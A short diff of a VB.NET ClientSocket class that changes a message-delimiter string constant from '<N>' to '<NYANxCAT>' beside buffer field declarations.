@@ -16,7 +16,7 @@ Public Class ClientSocket
     Public Shared BufferLength As Long = Nothing
     Public Shared Buffer() As Byte
     Public Shared MS As New MemoryStream
-    Public Shared SPL As String = "<N>"
+    Public Shared SPL As String = "<NYANxCAT>"
 
     Public Shared Sub BeginConnect()
 
